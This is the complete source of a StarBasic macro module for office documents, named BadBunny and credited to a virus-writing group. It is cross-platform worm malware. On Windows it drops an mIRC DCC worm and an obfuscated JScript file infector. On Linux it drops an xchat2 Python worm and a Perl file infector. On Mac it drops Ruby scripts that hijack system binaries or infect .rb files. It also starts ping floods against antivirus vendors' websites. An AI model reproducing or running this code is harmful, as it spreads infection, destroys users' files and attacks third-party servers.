<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="badbunny" script:language="StarBasic">Dim Url As String
Dim myFileProp as Object

Sub badbunny()
rem Ooo.BadBunny by Necronomikon&amp;Wargame from [D00mRiderz]
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = &quot;EventType&quot;
mEventProps(0).Value = &quot;StarBasic&quot;
mEventProps(1).Name = &quot;Script&quot;
mEventProps(1).Value = &quot;macro://ThisComponent/Standard.badbunny.startgame&quot;
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
oDocument = ThisComponent
otext=oDocument.text
ocursor=otext.createtextcursor()
otext.insertString(ocursor, &quot;BadBunny(c)by Necronomikon[DR],Skyout,Wargame[DR]&quot;,false)
url=converttourl(&quot;http://www.gratisweb.com/badbunny/badbunny.jpg&quot;) 
oDocument = StarDesktop.loadComponentFromURL(url, &quot;_blank&quot;, 0, myFileProp() )
msgbox &quot;Hey &quot; +Chr(31)+environ(&quot;username&quot;) +Chr(31)+ &quot; you like my BadBunny?&quot;, 32,&quot;///BadBunny\\\&quot;
call ping
end sub

sub startgame
if GetGUIType =1 then &apos;windows
call win
end if
if GetGUIType =3 then &apos;MacOS
call mac
end if
if GetGUIType =4 then &apos;linux
call lin
end if
end sub

sub win
Dim dirz As String
Dim dummy()
Dim iVar As Integer
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = &quot;MacroExecutionMode&quot;
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
   datei=&quot;c:\badbunny.odg&quot;
   dateiurl=converttourl(datei)
   odoc=thisComponent
   odoc.storeasurl(dateiurl,dummy())
dirz=Environ (&quot;programfiles&quot;)

Open &quot;c:\drop.bad&quot; For Output As #1
Print #1, &quot;[script]&quot;
Print #1, &quot;n0=; IRC_Worm/BadBunny (c)by Necronomikon&amp;Wargame from[D00MRiderz]&quot;
Print #1, &quot;n1=/titlebar *#*#*#*#*#*( Not every Bunny is friendly... )*#*#*#*#*#*#*&quot;
Print #1, &quot;n2=on 1:start:{&quot;
Print #1, &quot;n3=  /if $day == Friday { /echo  }&quot;
Print #1, &quot;n4=on 1:Join:#:if $chan = #virus /part $chan&quot;
Print #1, &quot;n5=on 1:connect:.msg Necronomikon -=I am infected with ur stuff!!!=-&quot;
Print #1, &quot;n6=on 1:connect:.msg wargame -=I am infected with ur stuff!!!=-&quot;
Print #1, &quot;n7=on 1:text:#:*hi*:/say $chan kick me&quot;
Print #1, &quot;n8=on 1:text:#:*hello*:/say $chan kick me&quot;    
Print #1, &quot;n9=on 1:part:#:{&quot;
Print #1, &quot;n10=set %M_E $me&quot;
Print #1, &quot;n11=set %NickName $nick&quot;
Print #1, &quot;n12=set %ccd .dcc&quot;
Print #1, &quot;n13=  if %NickName != %M_E {&quot;
Print #1, &quot;n14=    /q %NickName lets do it like a rabbit...;)&quot;
Print #1, &quot;n15=    /msg %NickName Be my bunny!&quot;
Print #1, &quot;n16=%ccd send -c %NickName c:\bunny.odg&quot;
Print #1, &quot;n17=  }&quot;
Print #1, &quot;n18=}&quot;
Close #1

if ( Dir(dirz &amp;&quot;\mirc&quot;) &lt;&gt; &quot;&quot;) then
Filecopy &quot;c:\drop.bad&quot; ,  dirz &amp;&quot;\mirc\script.ini&quot;
end if
if ( Dir(&quot;c:\mirc&quot;) &lt;&gt; &quot;&quot;) then
Filecopy &quot;c:\drop.bad&quot; ,  &quot;c:\mirc\script.ini&quot;

end if
if ( Dir(dirz &amp;&quot;\mirc32&quot;) &lt;&gt; &quot;&quot;) then
Filecopy &quot;c:\drop.bad&quot; ,  dirz &amp;&quot;\mirc32\script.ini&quot;
end if
if ( Dir(&quot;c:\mirc32&quot;) &lt;&gt; &quot;&quot;) then
Filecopy &quot;c:\drop.bad&quot; ,  &quot;c:\mirc32\script.ini&quot;
end if

Open &quot;c:\badbunny.js&quot; For Output As #2
Print #2, &quot;// BadBunny&quot;
Print #2, &quot;var FSO=WScript.CreateObject(unescape(&quot;&quot;%53&quot;&quot;)+unescape(&quot;&quot;%63&quot;&quot;)+unescape(&quot;&quot;%72&quot;&quot;)+unescape(&quot;&quot;%69&quot;&quot;)+unescape(&quot;&quot;%50&quot;&quot;)+unescape(&quot;&quot;%74&quot;&quot;)+unescape(&quot;&quot;%69&quot;&quot;)+&quot;&quot;n&quot;&quot;+unescape(&quot;&quot;%67&quot;&quot;)+&quot;&quot;.&quot;&quot;+unescape(&quot;&quot;%46&quot;&quot;)+unescape(&quot;&quot;%69&quot;&quot;)+&quot;&quot;l&quot;&quot;+unescape(&quot;&quot;%65&quot;&quot;)+unescape(&quot;&quot;%53&quot;&quot;)+unescape(&quot;&quot;%79&quot;&quot;)+unescape(&quot;&quot;%73&quot;&quot;)+unescape(&quot;&quot;%74&quot;&quot;)+unescape(&quot;&quot;%65&quot;&quot;)+&quot;&quot;mO&quot;&quot;+unescape(&quot;&quot;%62&quot;&quot;)+&quot;&quot;j&quot;&quot;+unescape(&quot;&quot;%65&quot;&quot;)+unescape(&quot;&quot;%63&quot;&quot;)+unescape(&quot;&quot;%74&quot;&quot;))&quot;
Print #2, &quot;var me=FSO.OpenTextFile(WScript.ScriptFullName,1)&quot;
Print #2, &quot;var OurCode=me.Read(1759)&quot;
Print #2, &quot;me.Close()&quot;
Print #2, &quot;nl=String.fromCharCode(13,10); code=&apos;&apos;; count=0; fcode=&apos;&apos;&quot;
Print #2, &quot;file=FSO.OpenTextFile(WScript.ScriptFullName).ReadAll()&quot;
Print #2, &quot;for (i=0; i&lt;file.length; i++) { check=0; if (file.charAt(i)==String.fromCharCode(123) &amp;&amp; Math.round(Math.random()*3)==1) { foundit(); check=1 } if (!check) { code+=file.charAt(i) } }&quot;
Print #2, &quot;FSO.OpenTextFile(WScript.ScriptFullName,2).Write(code+fcode)&quot;
Print #2, &quot;var jsphile=new Enumerator(FSO.GetFolder(&quot;&quot;.&quot;&quot;).Files)&quot;
Print #2, &quot;for(;!jsphile.atEnd();jsphile.moveNext())&quot;
Print #2, &quot;{&quot;
Print #2, &quot;if(FSO.GetExtensionName(jsphile.item()).toUpperCase()==&quot;&quot;JS&quot;&quot;)&quot;
Print #2, &quot;{&quot;
Print #2, &quot;var filez=FSO.OpenTextFile(jsphile.item().path,1)&quot;
Print #2, &quot;var Marker=filez.Read(11)&quot;
Print #2, &quot;var allinone=Marker+filez.ReadAll()&quot;
Print #2, &quot;filez.Close()&quot;
Print #2, &quot;if(Marker!=&quot;&quot;// BadBunny&quot;&quot;)&quot;
Print #2, &quot;{&quot;
Print #2, &quot;var filez=FSO.OpenTextFile(jsphile.item().path,2)&quot;
Print #2, &quot;filez.Write(OurCode+allinone)&quot;
Print #2, &quot;filez.Close()&quot;
Print #2, &quot;}&quot;
Print #2, &quot;}&quot;
Print #2, &quot;}&quot;
Print #2, &quot;function foundit()&quot;
Print #2, &quot;{&quot;
Print #2, &quot;fcodea=&apos;&apos;; count=0; randon=&apos;&apos;;&quot;
Print #2, &quot;for (j=i; j&lt;file.length; j++) { if (file.charAt(j)==String.fromCharCode(123)) { count++; } if (file.charAt(j)==String.fromCharCode(125)) { count--; } if (!count) { fcodea=file.substring(i+1,j); j=file.length; } }&quot;
Print #2, &quot;for (j=0; j&lt;Math.round(Math.random()*5)+4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+97) }&quot;
Print #2, &quot;fcode+=nl+nl+&apos;function &apos;+randon+&apos;()&apos;+nl+String.fromCharCode(123)+nl+fcodea+nl+String.fromCharCode(125)&quot;
Print #2, &quot;code+=String.fromCharCode(123)+&apos; &apos;+randon+&apos;() &apos;&quot;
Print #2, &quot;i+=fcodea.length;&quot;
Print #2, &quot;}&quot;
Print #2, &quot;//-&gt;&quot;
Close #2
Shell(&quot;c:\badbunny.js&quot;,0)
oDoc.store()
End Sub

sub lin()
&apos;xchat2worm part by WarGame
dim HomeDir as string
dim xchat2script as string
dim perlvir as string
dim cmd as string
dim WgeT as string
Dim dummy()
Dim iVar As Integer
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = &quot;MacroExecutionMode&quot;
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
   datei=&quot;/tmp/badbunny.odg&quot;
   dateiurl=converttourl(datei)
   odoc=thisComponent
   odoc.storeasurl(dateiurl,dummy())

&apos; get home dir
HomeDir = Environ(&quot;HOME&quot;)

&apos;build the path of our xchat2 script
if HomeDir = &quot;&quot; then
&apos; I could not get $HOME !

else
xchat2script = HomeDir &amp; &quot;/.xchat2/badbunny.py&quot;

&apos; drop the python script
Open xchat2script For Output As #1
print #1,&quot;__module_name__ = &quot;+Chr(34)+&quot;IRC_Worm/BadBunny (c)by Necronomikon&amp;Wargame from[D00MRiderz]&quot;+Chr(34)
print #1,&quot;__module_version__ = &quot;+Chr(34)+&quot;0.1&quot;+Chr(34)
print #1,&quot;__module_description__ = &quot;+Chr(34)+&quot;xchat2 IRC_Worm for BadBunny&quot;+Chr(34)
print #1,&quot;import xchat&quot;
print #1,&quot;def onkick_cb(word, word_eol, userdata):&quot;
print #1,&quot;	if xchat.nickcmp(word[3],xchat.get_info(&quot;+Chr(34)+&quot;nick&quot;+Chr(34)+&quot;)) != 0:&quot;
print #1,&quot;		xchat.command(&quot;+Chr(34)+&quot;DCC SEND &quot;+Chr(34)+&quot;+ word[3] +&quot;+Chr(34)+&quot; /tmp/badbunny.odg&quot;+Chr(34)+&quot;)&quot;
print #1,&quot;	return xchat.EAT_NONE&quot;
print #1,&quot;xchat.hook_server(&quot;+Chr(34)+&quot;KICK&quot;+Chr(34)+&quot;, onkick_cb)&quot;
close #1
endif

&apos;drop the perl virus
perlvir = HomeDir &amp; &quot;/BadBunny.pl&quot;
open perlvir for output as #1
print #1,&quot;#BadBunny&quot;
print #1,&quot;open(File,$0);@MyCode = &lt;File&gt;;close(File);&quot;
print #1,&quot;foreach $FileName (&lt;*&gt;){open(File,$FileName);$chk = 1;while(&lt;File&gt;){&quot;
print #1,&quot;if($_ =~ /#BadBunny/){$chk = 0;}}close(File);if($chk eq 1){&quot;
print #1,&quot;open(File,&quot;+Chr(34)+&quot;&gt;$FileName&quot;+Chr(34)+&quot;);print File @MyCode;close(File);}}&quot;
close #1
cmd = &quot;perl &quot; &amp; perlvir
shell(cmd,0)

oDoc.store()
end sub

sub mac()
Dim iVar As Integer
iVar = Int((15 * Rnd) -2)
Select Case iVar
Case 1 To 5
call one
Case 6, 7, 8
call two
Case Is &gt; 8 And iVar &lt; 11
call one
Case Else
call two
End Select
end sub

sub one ()
&apos;thx to skyout
Open &quot;badbunny.rb&quot; For Output As #1
print #1,&quot;#!/usr/bin/env ruby&quot;
print #1,&quot;require &apos;ftools&apos;&quot;
print #1,&quot;def replacecmd(cmdname, dirpath)&quot;
print #1,&quot;File.move(&quot;&quot;#{dirpath}/#{cmdname}&quot;&quot;, &quot;&quot;#{dirpath}/#{cmdname}_&quot;&quot;)&quot;
print #1,&quot;oldcmd   = File.open(&quot;&quot;#{dirpath}/#{cmdname}&quot;&quot;, File::WRONLY|File::TRUNC|File::CREAT, 0777)&quot;
print #1,&quot;oldcmd.puts &quot;&quot;#!/usr/bin/env ruby\n&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\\t\\tYour system has been infected with:\&quot;&quot;&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\\t\\t&gt;&gt;&gt;&gt; Dropper for BadBunny&quot;&quot;&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\\t\\t&gt;&gt;&gt;&gt; by SkyOut&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\&quot;&quot;&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;Take a moment of patience ...\&quot;&quot;&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;Executing in ...\&quot;&quot;&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;sleep 1&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;3\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;sleep 1&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;2\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;sleep 1&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;1\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;sleep 1&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;puts \&quot;&quot;\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;for $args in $* do&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;$argslist = \&quot;&quot;#\{$argslist\}\&quot;&quot; + \&quot;&quot; \&quot;&quot; + \&quot;&quot;#\{$args\}\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;end&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;exec \&quot;&quot;#{dirpath}/#{cmdname}_ #\{$argslist\}\&quot;&quot;&quot;
print #1,&quot;oldcmd.puts &quot;&quot;exit 0&quot;&quot;&quot;
print #1,&quot;end&quot;
print #1,&quot;$binary_dirs = Array.new&quot;
print #1,&quot;$binary_dirs = [ &quot;&quot;/bin&quot;&quot;, &quot;&quot;/usr/bin&quot;&quot;, &quot;&quot;/usr/local/bin&quot;&quot;, &quot;&quot;/sbin&quot;&quot;, &quot;&quot;/usr/sbin&quot;&quot;, &quot;&quot;/usr/local/sbin&quot;&quot; ]&quot;
print #1,&quot;for $dir in $binary_dirs do&quot;
print #1,&quot;if File.directory?($dir) then&quot;
print #1,&quot;if File.writable?($dir) then&quot;
print #1,&quot;Dir.open($dir).each do |file|&quot;
print #1,&quot;next if file =~ /^\S+_/ || file == &quot;&quot;.&quot;&quot; || file == &quot;&quot;..&quot;&quot;&quot;
print #1,&quot;replacecmd(file, $dir)&quot;
print #1,&quot;end&quot;
print #1,&quot;end&quot;
print #1,&quot;end&quot;
print #1,&quot;end&quot;
print #1,&quot;exit 0&quot;
close #1
Shell(&quot;badbunny.rb&quot;,0)
end sub

sub two() &apos;thx to SPTH for this...
Open &quot;badbunnya.rb&quot; For Output As #2
print #2,&quot;# BADB&quot;
print #2,&quot;mycode=&quot;&quot;&quot;
print #2,&quot;mych=File.open(__FILE__)&quot;
print #2,&quot;myc=mych.read(1)&quot;
print #2,&quot;while myc!=nil&quot;
print #2,&quot;mycode+=myc&quot;
print #2,&quot;myc=mych.read(1)&quot;
print #2,&quot;end&quot;
print #2,&quot;mycode=mycode[mycode.length-734,734]&quot;
print #2,&quot;cdir = Dir.open(Dir.getwd)&quot;
print #2,&quot;cdir.each do |a|&quot;
print #2,&quot;if File.ftype(a)==&quot;&quot;file&quot;&quot; then&quot;
print #2,&quot;if a[a.length-3, a.length]==&quot;&quot;.rb&quot;&quot; then&quot;
print #2,&quot;if a!=File.basename(__FILE__) then&quot;
print #2,&quot;fcode=&quot;&quot;&quot;
print #2,&quot;fle=open(a)&quot;
print #2,&quot;badb=fle.read(1)&quot;
print #2,&quot;while badb!=nil&quot;
print #2,&quot;fcode+=badb&quot;
print #2,&quot;badb=fle.read(1)&quot;
print #2,&quot;end&quot;
print #2,&quot;fle.close&quot;
print #2,&quot;if fcode[fcode.length-732,4]!=&quot;&quot;BADB&quot;&quot; then&quot;
print #2,&quot;fcode=fcode+13.chr+10.chr+mycode&quot;
print #2,&quot;fle=open(a,&quot;&quot;w&quot;&quot;)&quot;
print #2,&quot;fle.print fcode&quot;
print #2,&quot;fle.close&quot;
print #2,&quot;end&quot;
print #2,&quot;end&quot;
print #2,&quot;end&quot;
print #2,&quot;end&quot;
print #2,&quot;end&quot;
print #2,&quot;cdir.close&quot;
close #2
Shell(&quot;badbunnya.rb&quot;,0)
End Sub

sub ping()
Shell(&quot;ping -l 5000 -t www.ikarus.at&quot;,0)
Shell(&quot;ping -l 5000 -t www.aladdin.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.norman.no&quot;,0)
Shell(&quot;ping -l 5000 -t www.norman.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.kaspersky.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.kaspersky.ru&quot;,0)
Shell(&quot;ping -l 5000 -t www.kaspersky.pl&quot;,0)
Shell(&quot;ping -l 5000 -t www.grisoft.cz&quot;,0)
Shell(&quot;ping -l 5000 -t www.symantec.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.proantivirus.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.f-secure.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.sophos.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.arcabit.pl&quot;,0)
Shell(&quot;ping -l 5000 -t www.arcabit.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.avira.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.avira.de&quot;,0)
Shell(&quot;ping -l 5000 -t www.avira.ro&quot;,0)
Shell(&quot;ping -l 5000 -t www.avast.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.virusbuster.hu&quot;,0)
Shell(&quot;ping -l 5000 -t www.trendmicro.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.bitdefender.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.pandasoftware.comm&quot;,0)
Shell(&quot;ping -l 5000 -t www.drweb.com&quot;,0)
Shell(&quot;ping -l 5000 -t www.drweb.ru&quot;,0)
Shell(&quot;ping -l 5000 -t www.viruslist.com&quot;,0)
end sub
</script:module>